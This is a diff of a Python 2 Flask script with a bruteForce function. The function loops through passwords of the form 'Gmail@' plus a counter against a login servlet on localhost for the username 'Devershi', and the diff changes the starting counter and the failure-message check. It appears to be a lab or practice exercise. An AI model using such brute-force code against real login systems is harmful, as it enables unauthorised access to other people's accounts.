@@ -8,7 +8,7 @@ def bruteForce():
 	url = "http://localhost:8080/session/LoginServlet"
 	br = {}
 	br["name"] = "Devershi"
-	i = 120
+	i = 1
 	while True:
 		br["password"] = str("Gmail@")+str(i)
 		print 'Now trying password ' + br["password"]
@@ -19,13 +19,13 @@ def bruteForce():
 		data = ""
 		with open(response_file, 'r') as myfile:
 			data = myfile.read().replace('\n', ' ')
-		if "Sorry, username or password error!/" in  data:
+		if "Sorry, username or password" in  data:
 			print 'Failed for password ' + br["password"]
 			i+=1
 			data = ""
 		else:
 			break
-		print 'howdy'
+		# print 'howdy'
 	return render_template('results.html')
 if __name__ == '__main__':
 	app.run()
